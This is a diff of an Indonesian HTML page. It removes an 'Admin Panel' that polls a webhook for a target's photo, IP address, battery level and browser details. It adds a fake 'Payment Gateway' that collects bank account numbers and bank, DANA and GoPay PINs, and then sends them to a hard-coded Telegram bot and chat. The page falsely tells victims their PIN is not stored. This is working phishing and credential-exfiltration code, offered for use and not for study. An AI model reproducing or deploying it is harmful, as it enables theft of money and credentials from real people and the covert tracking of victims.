@@ -1,39 +1,477 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8">
-<title>Admin Panel</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{background:#111;color:#eee;font-family:Arial,Helvetica,sans-serif;text-align:center;padding:20px}
-img{max-width:100%;border-radius:8px}
-#log{margin-top:20px;text-align:left;display:inline-block;background:#222;padding:15px;border-radius:6px;max-width:90%;white-space:pre-wrap}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway - Bank, Dana & GoPay</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        header {
+            background: #2c3e50;
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            font-size: 24px;
+            color: #3498db;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .payment-methods {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+        
+        .payment-method {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-method.active {
+            border-color: #3498db;
+            background-color: #e8f4fc;
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .payment-method i {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+        
+        .bank-icon {
+            color: #2c3e50;
+        }
+        
+        .dana-icon {
+            color: #118eea;
+        }
+        
+        .gopay-icon {
+            color: #00aae7;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .form-group.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+        
+        select, input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        select:focus, input:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        
+        input[type="password"] {
+            letter-spacing: 4px;
+            font-weight: bold;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, #3498db, #2980b9);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-telegram {
+            background: linear-gradient(to right, #0088cc, #006da3);
+            margin-top: 15px;
+        }
+        
+        .btn-verify {
+            background: linear-gradient(to right, #4CAF50, #2E7D32);
+        }
+        
+        .disclaimer {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #6c757d;
+            border-left: 4px solid #3498db;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            color: #6c757d;
+            font-size: 14px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: #4CAF50;
+            color: white;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(150%);
+            transition: transform 0.3s ease-out;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            background: #f44336;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .payment-methods {
+                flex-direction: column;
+            }
+        }
+    </style>
 </head>
 <body>
-<h2>Admin Panel - Foto & Data Target</h2>
-<img id="pic" style="display:none">
-<div id="log">Menunggu data...</div>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-money-bill-wave"></i>
+            </div>
+            <h1>Payment Gateway</h1>
+            <p class="subtitle">Pilih metode pembayaran Anda</p>
+        </header>
+        
+        <div class="content">
+            <div class="payment-methods">
+                <div class="payment-method active" data-method="bank">
+                    <i class="fas fa-university bank-icon"></i>
+                    <div>Transfer Bank</div>
+                </div>
+                <div class="payment-method" data-method="dana">
+                    <i class="fas fa-wallet dana-icon"></i>
+                    <div>DANA</div>
+                </div>
+                <div class="payment-method" data-method="gopay">
+                    <i class="fas fa-mobile-alt gopay-icon"></i>
+                    <div>GoPay</div>
+                </div>
+            </div>
+            
+            <form id="paymentForm">
+                <!-- Form untuk Bank -->
+                <div class="form-group active" id="bank-form">
+                    <label for="bankSelect">Pilih Bank:</label>
+                    <select id="bankSelect" required>
+                        <option value="">-- Pilih Bank --</option>
+                        <option value="bca">BCA (Bank Central Asia)</option>
+                        <option value="bni">BNI (Bank Negara Indonesia)</option>
+                        <option value="bri">BRI (Bank Rakyat Indonesia)</option>
+                        <option value="mandiri">Bank Mandiri</option>
+                        <option value="cimb">CIMB Niaga</option>
+                        <option value="danamon">Bank Danamon</option>
+                    </select>
+                    
+                    <label for="accountNumber">Nomor Rekening:</label>
+                    <input type="text" id="accountNumber" placeholder="Masukkan nomor rekening" required>
+                    
+                    <label for="bankPin">PIN Bank:</label>
+                    <input type="password" id="bankPin" placeholder="Masukkan PIN bank" maxlength="6" required>
+                </div>
+                
+                <!-- Form untuk DANA -->
+                <div class="form-group" id="dana-form">
+                    <label for="danaNumber">Nomor Telepon DANA:</label>
+                    <input type="text" id="danaNumber" placeholder="Masukkan nomor DANA" required>
+                    
+                    <label for="danaPin">PIN DANA:</label>
+                    <input type="password" id="danaPin" placeholder="Masukkan PIN DANA" maxlength="6" required>
+                </div>
+                
+                <!-- Form untuk GoPay -->
+                <div class="form-group" id="gopay-form">
+                    <label for="gopayNumber">Nomor Telepon GoPay:</label>
+                    <input type="text" id="gopayNumber" placeholder="Masukkan nomor GoPay" required>
+                    
+                    <label for="gopayPin">PIN GoPay:</label>
+                    <input type="password" id="gopayPin" placeholder="Masukkan PIN GoPay" maxlength="6" required>
+                </div>
+                
+                <label for="userPin">PIN Anda:</label>
+                <input type="password" id="userPin" placeholder="Masukkan PIN Anda" maxlength="6" required>
+                
+                <button type="button" id="verifyBtn" class="btn btn-verify">
+                    <i class="fas fa-check-circle"></i> Verifikasi & Lanjutkan Pembayaran
+                </button>
+            </form>
+            
+            <div class="disclaimer">
+                <strong>Perhatian:</strong> Pastikan informasi yang Anda masukkan benar. Kami tidak menyimpan data PIN Anda.
+            </div>
+        </div>
+        
+        <footer>
+            <p>&copy; 2023 Payment Gateway. Semua hak dilindungi.</p>
+        </footer>
+    </div>
 
-<script>
-const WEBHOOK_URL = 'https://usewebhook.com/f06bc9bdb93468dc3259a91fcf2cdf12'; // ganti
-async function poll(){
-  try{
-    const r = await fetch(WEBHOOK_URL+'.json');
-    if(!r.ok) return;
-    const arr = await r.json();
-    if(!arr.length) return;
-    const latest = arr[arr.length-1];
-    document.getElementById('pic').src = latest.body.foto;
-    document.getElementById('pic').style.display = 'block';
-    document.getElementById('log').textContent =
-      `User-Agent : ${latest.headers['user-agent']}\n`+
-      `IP Publik  : ${latest.body.ip}\n`+
-      `Baterai    : ${latest.body.bat}\n`+
-      `Waktu      : ${latest.body.ts}`;
-  }catch(e){}
-}
-setInterval(poll,3000);
-</script>
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <span id="notification-text">Data berhasil dikirim!</span>
+    </div>
+
+    <script>
+        // Token bot Telegram Anda
+        const BOT_TOKEN = "8021598214:AAF-6-530XLoDwvLLozV0Gs6Tz8ulFTW-ho";
+        const CHAT_ID = "6157377532"; // Chat ID yang Anda berikan
+        
+        // Variabel untuk menyimpan metode pembayaran yang dipilih
+        let selectedMethod = "bank";
+        
+        // Fungsi untuk mengubah metode pembayaran
+        document.querySelectorAll('.payment-method').forEach(method => {
+            method.addEventListener('click', function() {
+                // Hapus kelas active dari semua metode
+                document.querySelectorAll('.payment-method').forEach(m => {
+                    m.classList.remove('active');
+                });
+                
+                // Tambahkan kelas active ke metode yang dipilih
+                this.classList.add('active');
+                
+                // Sembunyikan semua form
+                document.querySelectorAll('.form-group').forEach(form => {
+                    form.classList.remove('active');
+                });
+                
+                // Tampilkan form yang sesuai
+                selectedMethod = this.getAttribute('data-method');
+                document.getElementById(`${selectedMethod}-form`).classList.add('active');
+            });
+        });
+        
+        // Fungsi untuk verifikasi dan kirim data
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            const userPin = document.getElementById('userPin').value;
+            
+            if (!userPin) {
+                showNotification('Masukkan PIN Anda terlebih dahulu', true);
+                return;
+            }
+            
+            let data = {};
+            data.userPin = userPin;
+            
+            // Ambil data berdasarkan metode pembayaran
+            if (selectedMethod === 'bank') {
+                const bank = document.getElementById('bankSelect');
+                const accountNumber = document.getElementById('accountNumber').value;
+                const pin = document.getElementById('bankPin').value;
+                
+                if (!bank.value || !accountNumber || !pin) {
+                    showNotification('Lengkapi semua data bank', true);
+                    return;
+                }
+                
+                data.method = 'Bank';
+                data.bank = bank.options[bank.selectedIndex].text;
+                data.account = accountNumber;
+                data.pin = pin;
+            } 
+            else if (selectedMethod === 'dana') {
+                const number = document.getElementById('danaNumber').value;
+                const pin = document.getElementById('danaPin').value;
+                
+                if (!number || !pin) {
+                    showNotification('Lengkapi semua data DANA', true);
+                    return;
+                }
+                
+                data.method = 'DANA';
+                data.number = number;
+                data.pin = pin;
+            } 
+            else if (selectedMethod === 'gopay') {
+                const number = document.getElementById('gopayNumber').value;
+                const pin = document.getElementById('gopayPin').value;
+                
+                if (!number || !pin) {
+                    showNotification('Lengkapi semua data GoPay', true);
+                    return;
+                }
+                
+                data.method = 'GoPay';
+                data.number = number;
+                data.pin = pin;
+            }
+            
+            // Kirim data ke Telegram
+            sendToTelegram(data);
+        });
+        
+        // Fungsi untuk mengirim data ke Telegram
+        function sendToTelegram(data) {
+            let message = `🔔 *Pembayaran Baru* 🔔\n\n`;
+            message += `🔐 *PIN Anda:* ${data.userPin}\n`;
+            message += `💳 *Metode:* ${data.method}\n`;
+            
+            if (data.method === 'Bank') {
+                message += `🏦 *Bank:* ${data.bank}\n`;
+                message += `📋 *No. Rekening:* ${data.account}\n`;
+                message += `🔢 *PIN Bank:* ${data.pin}\n`;
+            } else {
+                message += `📱 *Nomor:* ${data.number}\n`;
+                message += `🔢 *PIN ${data.method}:* ${data.pin}\n`;
+            }
+            
+            message += `\n_Data dikirim dari Payment Gateway_`;
+            
+            // Encode message untuk URL Telegram
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Buat URL Telegram
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+            
+            // Kirim data menggunakan fetch API
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showNotification('Pembayaran berhasil! Data telah dikirim.');
+                        // Reset form setelah berhasil
+                        document.getElementById('paymentForm').reset();
+                    } else {
+                        showNotification('Gagal mengirim data. Silakan coba lagi.', true);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showNotification('Terjadi kesalahan. Silakan coba lagi.', true);
+                });
+        }
+        
+        // Fungsi untuk menampilkan notifikasi
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notification-text');
+            
+            notificationText.textContent = message;
+            
+            if (isError) {
+                notification.classList.add('error');
+            } else {
+                notification.classList.remove('error');
+            }
+            
+            notification.classList.add('show');
+            
+            // Sembunyikan notifikasi setelah 3 detik
+            setTimeout(function() {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
